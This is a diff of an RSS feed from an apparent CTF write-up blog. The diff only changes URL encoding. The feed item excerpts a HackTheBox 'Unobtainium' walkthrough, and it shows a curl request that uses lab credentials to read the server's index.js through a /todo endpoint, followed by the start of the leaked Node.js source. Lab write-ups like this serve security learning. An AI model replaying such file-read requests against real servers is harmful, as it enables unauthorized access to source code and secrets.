@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>malicious_pod on Poney Island</title>
-    <link>https://0xade1.github.io/$DEV_BASEURL/tags/malicious_pod/</link>
+    <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/tags/malicious_pod/</link>
     <description>Recent content in malicious_pod on Poney Island</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 11 Sep 2021 00:54:12 +0800</lastBuildDate><atom:link href="https://0xade1.github.io/$DEV_BASEURL/tags/malicious_pod/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 11 Sep 2021 00:54:12 +0800</lastBuildDate><atom:link href="https://0xade1.github.io/$%7BDEV_BASEURL%7D/tags/malicious_pod/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HTB - Unobtainium</title>
-      <link>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-unobtainium/</link>
+      <link>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-unobtainium/</link>
       <pubDate>Sat, 11 Sep 2021 00:54:12 +0800</pubDate>
       
-      <guid>https://0xade1.github.io/$DEV_BASEURL/posts/2021/09/htb-unobtainium/</guid>
+      <guid>https://0xade1.github.io/$%7BDEV_BASEURL%7D/posts/2021/09/htb-unobtainium/</guid>
       <description>1 2 3  curl -s -X $&amp;#39;POST&amp;#39; http://unobtainium.htb:31337/todo \ -H $&amp;#39;Content-Type: application/json&amp;#39; \ -d &amp;#39;{&amp;#34;auth&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;felamos&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;Winter2021&amp;#34;}, &amp;#34;filename&amp;#34; : &amp;#34;index.js&amp;#34;}&amp;#39; | jq -r &amp;#39;.content&amp;#39;   output:
 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97  var root = require(&amp;#34;google-cloudstorage-commands&amp;#34;); const express = require(&amp;#34;express&amp;#34;); const { exec } = require(&amp;#34;child_process&amp;#34;); const bodyParser = require(&amp;#34;body-parser&amp;#34;); const _ = require(&amp;#34;lodash&amp;#34;); const app = express(); var fs = require(&amp;#34;fs&amp;#34;); const users = [ { name: &amp;#34;felamos&amp;#34;, password: &amp;#34;Winter2021&amp;#34; }, { name: &amp;#34;admin&amp;#34;, password: Math.</description>
     </item>
